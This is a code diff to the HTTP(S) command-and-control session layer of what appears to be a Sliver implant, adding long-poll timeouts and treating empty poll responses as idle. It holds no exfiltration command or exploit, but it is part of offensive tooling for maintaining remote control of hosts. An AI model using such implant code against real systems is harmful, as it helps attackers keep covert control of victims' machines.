@@ -1,4 +1,4 @@
-/* src/transport/http_session.c - Sliver HTTP(S) C2 session layer (H3).
+﻿/* src/transport/http_session.c - Sliver HTTP(S) C2 session layer (H3).
  *
  * The real listener does not accept bare envelopes: it authenticates a session
  * cookie, decodes the body with a nonce-selected encoder and decrypts it with the
@@ -100,6 +100,17 @@ int sliver_http_session_exchange(sliver_http_session_t *s, const char *method,
   }
 
   session_target(s, target, sizeof(target));
+  {
+    /* Long poll: a GET waits up to poll_timeout; a POST must not. */
+    int timeout_ms = HTTP_SESSION_RECV_TIMEOUT_MS;
+    if (s->poll_timeout_ns > 0 && method != NULL && strcmp(method, "GET") == 0) {
+      long long ms = s->poll_timeout_ns / 1000000LL;
+      if (ms > 0 && ms < 120000) {
+        timeout_ms = (int)ms;
+      }
+    }
+    s->timeout_ms = timeout_ms;
+  }
 
   if (s->use_tls) {
     errbuf[0] = '\0';
@@ -113,7 +124,7 @@ int sliver_http_session_exchange(sliver_http_session_t *s, const char *method,
       LOG_WARN("http-c2: cannot connect to %s:%u", s->host, (unsigned)s->port);
       return -1;
     }
-    sliver_socket_set_recv_timeout(sock, HTTP_SESSION_RECV_TIMEOUT_MS);
+    sliver_socket_set_recv_timeout(sock, s->timeout_ms);
     sliver_socket_set_send_timeout(sock, HTTP_SESSION_RECV_TIMEOUT_MS);
   }
 
@@ -198,8 +209,13 @@ int sliver_http_session_exchange(sliver_http_session_t *s, const char *method,
   }
 
   if (total == 0 || buf == NULL) {
+    /* No response at all (long-poll timeout): status 0 lets the caller treat it
+     * as idle instead of a failure. */
     free(buf);
-    return -1;
+    if (status_out != NULL) {
+      *status_out = 0;
+    }
+    return 0;
   }
   {
     const unsigned char *sep = NULL;
@@ -389,6 +405,10 @@ int sliver_http_session_recv(sliver_http_session_t *s, sliver_buf_t *env_out) {
     return -1;
   }
   LOG_DEBUG("http-c2: poll status %d (%u bytes)", status, (unsigned)resp_len);
+  if (status == 0) {
+    free(resp);
+    return 1; /* long-poll timed out with nothing queued: idle */
+  }
   if (status == 204) {
     free(resp);
     return 1; /* idle: nothing to do, keep the loop alive */
